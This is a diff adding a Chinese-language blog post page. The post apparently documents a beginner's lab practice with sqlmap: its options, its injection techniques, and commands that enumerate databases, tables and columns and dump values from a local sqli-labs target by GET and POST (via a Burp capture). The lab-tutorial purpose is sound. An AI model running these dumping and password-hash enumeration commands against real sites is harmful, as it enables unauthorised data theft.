@@ -1,0 +1,316 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+	<link rel="bookmark"  type="image/x-icon"  href="/img/logo_miccall.jpg"/>
+	<link rel="shortcut icon" href="/img/logo_miccall.jpg">
+	
+			    <title>
+    liquor's blog
+    </title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="/css/mic_main.css" />
+    <link rel="stylesheet" href="/css/dropdownMenu.css" />
+    <meta name="keywords" content="miccall" />
+    
+    	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	 
+    <noscript>
+        <link rel="stylesheet" href="/css/noscript.css" />
+    </noscript>
+    <style type="text/css">
+        body:before {
+          content: ' ';
+          position: fixed;
+          top: 0;
+          background: url('/img/bg.jpg') center 0 no-repeat;
+          right: 0;
+          bottom: 0;
+          left: 0;
+          background-size: cover; 
+        }
+    </style>
+
+			    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.scrollex.min.js"></script>
+    <script src="/js/jquery.scrolly.min.js"></script>
+    <script src="/js/skel.min.js"></script>
+    <script src="/js/util.js"></script>
+    <script src="/js/main.js"></script>
+	
+<meta name="generator" content="Hexo 5.2.0"></head>
+    
+		
+<!-- Layouts -->
+
+
+
+<!--  代码渲染  -->
+<link rel="stylesheet" href="/css/prism_coy.css" />
+<link rel="stylesheet" href="/css/typo.css" />
+<!-- 文章页 -->
+<body class="is-loading">
+    <!-- Wrapper 外包 s-->
+    <div id="wrapper" class="fade-in">
+        <!-- Intro 头部显示 s -->
+        <!-- Intro 头部显示 e -->
+        <!-- Header 头部logo start -->
+        <header id="header">
+    <a href="/" class="logo">Little Genius</a>
+</header>
+        <!-- Nav 导航条 start -->
+        <nav id="nav" class="special" >
+            <ul class="menu links" >
+			<!-- Homepage  主页  --> 
+			<li >
+	            <a href="/" rel="nofollow">主页</a>
+	        </li>
+			<!-- categories_name  分类   --> 
+	        
+	        <li class="active">
+	            <a href="#s1">分类</a>
+	                    <ul class="submenu">
+	                        <li>
+	                        
+	                    </ul>
+	        </li>
+	        
+	        <!-- archives  归档   --> 
+	        
+	        
+		        <!-- Pages 自定义   -->
+		        
+		        <li>
+		            <a href="/about/" title="简历">
+		                简历
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/group/" title="团队">
+		                团队
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/gallery/" title="图库">
+		                图库
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/tag/" title="标签">
+		                标签
+		            </a>
+		        </li>
+		        
+
+
+            </ul>
+            <!-- icons 图标   -->
+			<ul class="icons">
+                    
+                    <li>
+                        <a title="github" href="https://github.com/liquor-boop" target="_blank" rel="noopener">
+                            <i class="icon fa fa-github"></i>
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a title="500px" href="http://500px.com" target="_blank" rel="noopener">
+                            <i class="icon fa fa-500px"></i>
+                        </a>
+                    </li>
+                    
+			</ul>
+</nav>
+
+        <div id="main" >
+            <div class ="post_page_title_img" style="height: 25rem;background-image: url();background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >sqlmap</h2></a>
+            </div>
+            <!-- Post -->
+            <div class="typo" style="padding: 3rem;">
+                <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>sqlmap终于终于搭好了，之前的python环境没搭好，下了好多次换过2.X和3.X，设置环境变量的时候还不小心将path变量删了导致博客崩了……之后sqlmap解压错根目录了…终于把sqlmap搭好了想打靶场，发现还需要有抓包工具，于是又去搭java环境,下Burp Suite。现在终于可以了!!!</p>
+<h1 id="Sqlmap简介"><a href="#Sqlmap简介" class="headerlink" title="Sqlmap简介"></a>Sqlmap简介</h1><p>五种注入模式：布尔盲注，时间盲注，报错注入，联合查询，堆查询</p>
+<p>支持的数据库：MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p>
+<p>七种等级:</p>
+<ul>
+<li>0 只显示python错误以及严重的信息。</li>
+<li>1 同时显示基本信息和警告信息。（默认）</li>
+<li>2 同时显示debug信息。</li>
+<li>3 同时显示洼入的payload</li>
+<li>4 同时显示HTTP请求</li>
+<li>5 同时显示HTTP响应头</li>
+<li>6 同时显示HTTP响应页面。</li>
+</ul>
+<p>常用命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">-a, --all&#x2F;&#x2F;获取所有信息</span><br><span class="line"></span><br><span class="line">-b, --banner&#x2F;&#x2F;获取数据库管理系统的标识</span><br><span class="line"></span><br><span class="line">--current-user&#x2F;&#x2F;获取数据库管理系统当前用户</span><br><span class="line"></span><br><span class="line">--current-db&#x2F;&#x2F;获取数据库管理系统当前数据库</span><br><span class="line"></span><br><span class="line">--hostname&#x2F;&#x2F;获取数据库服务器的主机名称</span><br><span class="line"></span><br><span class="line">--is-dba&#x2F;&#x2F;检测DBMS当前用户是否DBA</span><br><span class="line"></span><br><span class="line">--users&#x2F;&#x2F;枚举数据库管理系统用户</span><br><span class="line"></span><br><span class="line">--passwords&#x2F;&#x2F;枚举数据库管理系统用户密码哈希</span><br><span class="line"></span><br><span class="line">--privileges&#x2F;&#x2F;枚举数据库管理系统用户的权限</span><br><span class="line"></span><br><span class="line">--roles&#x2F;&#x2F;枚举数据库管理系统用户的角色</span><br><span class="line"></span><br><span class="line">--dbs&#x2F;&#x2F;枚举数据库管理系统数据库</span><br><span class="line"></span><br><span class="line">--tables&#x2F;&#x2F;枚举的DBMS数据库中的表</span><br><span class="line"></span><br><span class="line">--columns&#x2F;&#x2F;枚举DBMS数据库表列</span><br><span class="line"></span><br><span class="line">--schema&#x2F;&#x2F;枚举数据库架构</span><br><span class="line"></span><br><span class="line">--count&#x2F;&#x2F;检索表的项目数，获取表中的数据个数:sqlmap.py -u url --count -D testdb</span><br><span class="line"></span><br><span class="line">--dump&#x2F;&#x2F;转储数据库表项</span><br><span class="line"></span><br><span class="line">--dump-all&#x2F;&#x2F;转储数据库所有表项</span><br><span class="line"></span><br><span class="line">--search&#x2F;&#x2F;搜索列（S），表（S）和&#x2F;或数据库名称（S）</span><br><span class="line"></span><br><span class="line">--comments&#x2F;&#x2F;获取DBMS注释</span><br><span class="line"></span><br><span class="line">-D DB&#x2F;&#x2F;要进行枚举的指定数据库名</span><br><span class="line"></span><br><span class="line">-T TBL&#x2F;&#x2F;DBMS数据库表枚举</span><br><span class="line"></span><br><span class="line">-C COL&#x2F;&#x2F;DBMS数据库表列枚举</span><br><span class="line"></span><br><span class="line">-X EXCLUDECOL&#x2F;&#x2F;DBMS数据库表不进行枚举</span><br><span class="line"></span><br><span class="line">-U USER&#x2F;&#x2F;用来进行枚举的数据库用户</span><br><span class="line"></span><br><span class="line">--exclude-sysdbs&#x2F;&#x2F;枚举表时排除系统数据库</span><br><span class="line"></span><br><span class="line">--start&#x3D;LIMITSTART&#x2F;&#x2F;获取第一个查询输出数据位置</span><br><span class="line"></span><br><span class="line">--stop&#x3D;LIMITSTOP&#x2F;&#x2F;获取最后查询的输出数据</span><br><span class="line"></span><br><span class="line">--first&#x3D;FIRSTCHAR&#x2F;&#x2F;第一个查询输出字的字符获取</span><br><span class="line"></span><br><span class="line">--last&#x3D;LASTCHAR&#x2F;&#x2F;最后查询的输出字字符获取</span><br><span class="line"></span><br><span class="line">--sql-query&#x3D;QUERY&#x2F;&#x2F;要执行的SQL语句</span><br><span class="line"></span><br><span class="line">--sql-shell&#x2F;&#x2F;提示交互式SQL的shell</span><br><span class="line"></span><br><span class="line">--sql-file&#x3D;SQLFILE&#x2F;&#x2F;要执行的SQL文件</span><br></pre></td></tr></table></figure>
+
+<p>技术分类：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">–technique：</span><br><span class="line">B：布尔盲注</span><br><span class="line">E：报错</span><br><span class="line">U：联合</span><br><span class="line">S：堆叠</span><br><span class="line">T：时间</span><br><span class="line">Q：内联查询</span><br></pre></td></tr></table></figure>
+
+<h1 id="GET型"><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h1><h4 id="1-先测试是否存在注入"><a href="#1-先测试是否存在注入" class="headerlink" title="1.先测试是否存在注入"></a>1.先测试是否存在注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;Less-1&#x2F;?id&#x3D;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/01/sqlmap/1.jpg" alt="1"></p>
+<p>红框框中语句表明存在注入，有时候也可能不存在SQL注入。逐个测试会挺麻烦的可以批量检测，将目标url整理为txt文件，当文件保存为hhh.txt时使用“sqlmap.py-m hhh.txt”，注意<strong>hhh.txt跟sqlmap在同一个目录下</strong></p>
+<h4 id="2-查库"><a href="#2-查库" class="headerlink" title="2.查库"></a>2.查库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --dbs --batch</span><br></pre></td></tr></table></figure>
+
+<p>or</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [“url”] --current-db&#x2F;&#x2F;列出当前数据库</span><br></pre></td></tr></table></figure>
+
+<p><code>dbs</code>表示列出说有数据库，batch可以自动选择，也可以省略，但省略后就需要手动选择<img src="/2020/12/01/sqlmap/2.jpg" alt="2"></p>
+<h4 id="3-查表"><a href="#3-查表" class="headerlink" title="3.查表"></a>3.查表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [“url”] -D [‘数据库名’] --tables --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/01/sqlmap/3.jpg" alt="3"></p>
+<h4 id="4-查列"><a href="#4-查列" class="headerlink" title="4.查列"></a>4.查列</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [“url”] -D [‘数据库名’] -T[‘表名’] --columns --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/01/sqlmap/4.jpg" alt="4"></p>
+<h4 id="5-爆值"><a href="#5-爆值" class="headerlink" title="5.爆值"></a>5.爆值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [“url”] -D [‘数据库名’] -T [‘表名’] -C [‘字段名1,字段名2,…’] --dump --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/01/sqlmap/5.jpg" alt="5"></p>
+<p>关与关之间需要清除sqlmap缓存：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py --purge</span><br></pre></td></tr></table></figure>
+
+<h1 id="Post型"><a href="#Post型" class="headerlink" title="Post型"></a>Post型</h1><p>先用burp suite抓个包，保存到文件里</p>
+<p><img src="/2020/12/01/sqlmap/6.jpg" alt="6"></p>
+<p>执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r &quot;C:\Users\32270\Desktop\hhh.txt&quot; --leve&#x3D;5 --risk&#x3D;3 --dbs</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/01/sqlmap/7.jpg" alt="7"></p>
+<p>查表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r &quot;C:\Users\32270\Desktop\hhh.txt &quot; -D security --tables --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/01/sqlmap/8.jpg" alt="8"></p>
+<p>接下去跟get型一样。</p>
+
+            </div>
+
+            <!-- Post Comments -->
+            
+    <!-- 使用 DISQUS_CLICK -->
+<div id="disqus-comment">
+    <div id="disqus_thread"></div>
+
+<!-- add animation -->
+<style>
+	.disqus_click_btn {
+            line-height: 30px;
+            margin: 0;
+            min-width: 50px;
+            padding: 0 14px;
+            display: inline-block;
+            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            text-transform: uppercase;
+            letter-spacing: 0;
+            overflow: hidden;
+            will-change: box-shadow;
+            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
+            outline: 0;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+            vertical-align: middle;
+            border: 0;
+            background: rgba(158, 158, 158, .2);
+            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
+            color: #fff;
+            background-color: #7EC0EE;
+            text-shadow: 0
+        }
+</style>
+	
+<div class="btn_click_load" id="disqus_bt"> 
+    <button class="disqus_click_btn">点击查看评论</button>
+</div>
+
+<!--
+<script type="text/javascript">
+$('.btn_click_load').click(function() {
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'http-miccall-tech'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+
+    document.getElementById('disqus_bt').style.display = "none";
+});
+</script>
+-->
+<script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'http://liquor-boop.github.io/2020/12/01/sqlmap/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://liquor-boop.github.io/2020/12/01/sqlmap/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+</script>
+
+<script type="text/javascript">
+    $('.btn_click_load').click(function() {  //click to load comments
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document;
+            var s = d.createElement('script');
+            s.src = '//http-miccall-tech.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', + new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+        $('.btn_click_load').css('display','none');
+    });
+</script>
+</div>
+<style>
+    #disqus-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+
+        </div>
+        <!-- Copyright 版权 start -->
+                <div id="copyright">
+            <ul>
+                <li>&copy;Powered By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/" style="border-bottom: none;">hexo</a></li>
+                <li>Design: <a target="_blank" rel="noopener" href="http://miccall.tech " style="border-bottom: none;">miccall</a></li>
+            </ul>
+            
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+			
+        </div>
+    </div>
+</body>
+
+
+
+ 	
+</html>
